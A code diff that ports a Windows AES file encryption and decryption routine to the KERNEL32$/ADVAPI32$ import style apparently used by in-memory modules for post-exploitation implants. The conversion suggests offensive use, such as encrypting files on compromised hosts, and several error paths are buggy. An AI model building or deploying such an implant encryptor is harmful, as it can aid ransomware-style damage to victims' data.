@@ -27,58 +27,58 @@ void encryptFile(const char* inputFile, const char* outputFile, const char* aesK
 	HANDLE hOutputFile = INVALID_HANDLE_VALUE;
 
 	// Open input file for reading
-	hInputFile = CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	hInputFile = KERNEL32$CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hInputFile == INVALID_HANDLE_VALUE)
 		return;
 
 	// Check file size
 	LARGE_INTEGER fileSize;
-	if (!GetFileSizeEx(hInputFile, &fileSize)) {
-		CloseHandle(hInputFile);
+	if (!KERNEL32$GetFileSizeEx(hInputFile, &fileSize)) {
+		KERNEL32$CloseHandle(hInputFile);
 		return;
 	}
 
 	// Encrypt only if file size is less than 128MB
 	if (fileSize.QuadPart > 128 * 1024 * 1024) {
-		CloseHandle(hInputFile);
+		KERNEL32$CloseHandle(hInputFile);
 		return;
 	}
 
 	// Create output file for writing - output encrypted file
-	hOutputFile = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	hOutputFile = KERNEL32$CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hOutputFile == INVALID_HANDLE_VALUE) {
-		CloseHandle(hInputFile);
+		KERNEL32$CloseHandle(hInputFile);
 		return;
 	}
 
 	// Cryptographic service provider - choose which encryption provider to use
-	if (!CryptAcquireContextA(&hCryptProv, NULL, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
-		CryptDestroyKey(hKey);
-		CryptReleaseContext(hCryptProv, 0);
+	if (!ADVAPI32$CryptAcquireContextA(&hCryptProv, NULL, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+		ADVAPI32$CryptDestroyKey(hKey);
+		ADVAPI32$CryptReleaseContext(hCryptProv, 0);
 	}
 	
 	// Acquire a hash object handle. 2nd param includes the kind of hash/encryption to use
 	// This creates a hashed container in memory.
 	HCRYPTHASH hHash;
-	if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
-		CryptDestroyKey(hKey);
-		CryptReleaseContext(hCryptProv, 0);
+	if (!ADVAPI32$CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
+		ADVAPI32$CryptDestroyKey(hKey);
+		ADVAPI32$CryptReleaseContext(hCryptProv, 0);
 	}
 	
 	// Handle is used in subsequent calls to CryptHashData and CryptHashSessionKey to hash any stream of data.
 	// Adds data to a specified hash object. This function and CryptHashSessionKey can be called multiple times to compute the hash of long or discontinuous data streams. 
 	// The hashed container from previous WinAPI call grows with the amount of data ingested from this stream
-	if (!CryptHashData(hHash, (BYTE*)aesKey, MSVCRT$strlen(aesKey), 0)) {
-		CryptDestroyKey(hKey);
-		CryptReleaseContext(hCryptProv, 0);
+	if (!ADVAPI32$CryptHashData(hHash, (BYTE*)aesKey, MSVCRT$strlen(aesKey), 0)) {
+		ADVAPI32$CryptDestroyKey(hKey);
+		ADVAPI32$CryptReleaseContext(hCryptProv, 0);
 	}
 
 	// Generates cryptographic session keys derived from a base data value. This function guarantees that when the same cryptographic 
 	// service provider (CSP) and algorithms are used, the keys generated from the same base data are identical. 
 	// The base data can be a password or any other user data - in this case, its the handle to a hash object that has been fed the exact base data.
-	if (!CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
-		CryptDestroyKey(hKey);
-		CryptReleaseContext(hCryptProv, 0);
+	if (!ADVAPI32$CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
+		ADVAPI32$CryptDestroyKey(hKey);
+		ADVAPI32$CryptReleaseContext(hCryptProv, 0);
 	}
 
 	const size_t chunk_size = OUT_CHUNK_SIZE;
@@ -90,7 +90,7 @@ void encryptFile(const char* inputFile, const char* outputFile, const char* aesK
 	BOOL bResult = FALSE;
 
 	// Reads each byte of the input file to be stored on the buffer 'chunk'
-	while (bResult = ReadFile(hInputFile, chunk, IN_CHUNK_SIZE, &out_len, NULL)) {
+	while (bResult = KERNEL32$ReadFile(hInputFile, chunk, IN_CHUNK_SIZE, &out_len, NULL)) {
 		if (0 == out_len) {
 			break;
 		}
@@ -101,13 +101,13 @@ void encryptFile(const char* inputFile, const char* outputFile, const char* aesK
 
 		//  Encrypts each line of data(per 'ReadFile' execution). The algorithm used to encrypt the data is designated by the key held by the CSP module and is referenced by the hKey parameter.
 		// 5th param: A pointer to a buffer that contains the plaintext to be encrypted. The plaintext in this buffer is overwritten with the ciphertext created by this function.
-		if (!CryptEncrypt(hKey, (HCRYPTHASH)NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
+		if (!ADVAPI32$CryptEncrypt(hKey, (HCRYPTHASH)NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
 			break;
 		}
 
 		DWORD written = 0;
 		// Write the encrypted file
-		if (!WriteFile(hOutputFile, chunk, out_len, &written, NULL)) {
+		if (!KERNEL32$WriteFile(hOutputFile, chunk, out_len, &written, NULL)) {
 			break;
 		}
 
@@ -115,16 +115,16 @@ void encryptFile(const char* inputFile, const char* outputFile, const char* aesK
 	}
 
 	if (hKey) {
-		CryptDestroyKey(hKey);
+		ADVAPI32$CryptDestroyKey(hKey);
 	}
 	if (hCryptProv) {
-		CryptReleaseContext(hCryptProv, 0);
+		ADVAPI32$CryptReleaseContext(hCryptProv, 0);
 	}
 	if (hInputFile != INVALID_HANDLE_VALUE) {
-		CloseHandle(hInputFile);
+		KERNEL32$CloseHandle(hInputFile);
 	}
 	if (hOutputFile != INVALID_HANDLE_VALUE) {
-		CloseHandle(hOutputFile);
+		KERNEL32$CloseHandle(hOutputFile);
 	}
 
 	MSVCRT$free(chunk);
@@ -142,42 +142,42 @@ void decryptFile(const char* inputFile, const char* outputFile, const BYTE* aesK
 	DWORD key_size = len * sizeof(aesKey[0]);
 
 	// Open input file for reading
-	hInputFile = CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	hInputFile = KERNEL32$CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hInputFile == INVALID_HANDLE_VALUE) {
 		return;
 	}
 
 	// Create output file for writing
-	hOutputFile = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	hOutputFile = KERNEL32$CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hOutputFile == INVALID_HANDLE_VALUE) {
 		return;
 	}
 
 	// Cryptographic service provider
-	if (!CryptAcquireContextA(&hCryptProv, NULL, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
-		CryptDestroyKey(hKey);
-		CryptReleaseContext(hCryptProv, 0);
+	if (!ADVAPI32$CryptAcquireContextA(&hCryptProv, NULL, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+		ADVAPI32$CryptDestroyKey(hKey);
+		ADVAPI32$CryptReleaseContext(hCryptProv, 0);
 	}
 
 	HCRYPTHASH hHash;
-	if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
-		CryptDestroyKey(hKey);
-		CryptReleaseContext(hCryptProv, 0);
+	if (!ADVAPI32$CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
+		ADVAPI32$CryptDestroyKey(hKey);
+		ADVAPI32$CryptReleaseContext(hCryptProv, 0);
 	}
 
 	BYTE utf8ByteArray[32];
 	MSVCRT$strcpy((char*)utf8ByteArray, (const char*)aesKey);
 
-	if (!CryptHashData(hHash, utf8ByteArray, key_size, 0)) {
-		CryptDestroyKey(hKey);
-		CryptReleaseContext(hCryptProv, 0);
+	if (!ADVAPI32$CryptHashData(hHash, utf8ByteArray, key_size, 0)) {
+		ADVAPI32$CryptDestroyKey(hKey);
+		ADVAPI32$CryptReleaseContext(hCryptProv, 0);
 		return;
 	}
 
 	// HCRYPTKEY hKey;
-	if (!CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
-		CryptDestroyKey(hKey);
-		CryptReleaseContext(hCryptProv, 0);
+	if (!ADVAPI32$CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
+		ADVAPI32$CryptDestroyKey(hKey);
+		ADVAPI32$CryptReleaseContext(hCryptProv, 0);
 		return;
 	}
 
@@ -189,9 +189,9 @@ void decryptFile(const char* inputFile, const char* outputFile, const BYTE* aesK
 	DWORD readTotalSize = 0;
 	BOOL bResult = FALSE;
 
-	DWORD inputSize = GetFileSize(hInputFile, NULL);
+	DWORD inputSize = KERNEL32$GetFileSize(hInputFile, NULL);
 
-	while (bResult = ReadFile(hInputFile, chunk, IN_CHUNK_SIZE, &out_len, NULL)) {
+	while (bResult = KERNEL32$ReadFile(hInputFile, chunk, IN_CHUNK_SIZE, &out_len, NULL)) {
 		if (0 == out_len) {
 			break;
 		}
@@ -200,30 +200,30 @@ void decryptFile(const char* inputFile, const char* outputFile, const BYTE* aesK
 			isFinal = TRUE;
 		}
 
-		if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, isFinal, 0, chunk, &out_len)) {
-			CryptDestroyKey(hKey);
-			CryptReleaseContext(hCryptProv, 0);
+		if (!ADVAPI32$CryptDecrypt(hKey, (HCRYPTHASH)NULL, isFinal, 0, chunk, &out_len)) {
+			ADVAPI32$CryptDestroyKey(hKey);
+			ADVAPI32$CryptReleaseContext(hCryptProv, 0);
 			break;
 		}
 		DWORD written = 0;
-		if (!WriteFile(hOutputFile, chunk, out_len, &written, NULL)) {
-			CloseHandle(hOutputFile);
+		if (!KERNEL32$WriteFile(hOutputFile, chunk, out_len, &written, NULL)) {
+			KERNEL32$CloseHandle(hOutputFile);
 			break;
 		}
 		MSVCRT$memset(chunk, 0, chunk_size);
 	}
 
 	if (hKey) {
-		CryptDestroyKey(hKey);
+		ADVAPI32$CryptDestroyKey(hKey);
 	}
 	if (hCryptProv) {
-		CryptReleaseContext(hCryptProv, 0);
+		ADVAPI32$CryptReleaseContext(hCryptProv, 0);
 	}
 	if (hInputFile != INVALID_HANDLE_VALUE) {
-		CloseHandle(hInputFile);
+		KERNEL32$CloseHandle(hInputFile);
 	}
 	if (hOutputFile != INVALID_HANDLE_VALUE) {
-		CloseHandle(hOutputFile);
+		KERNEL32$CloseHandle(hOutputFile);
 	}
 
 	MSVCRT$free(chunk);
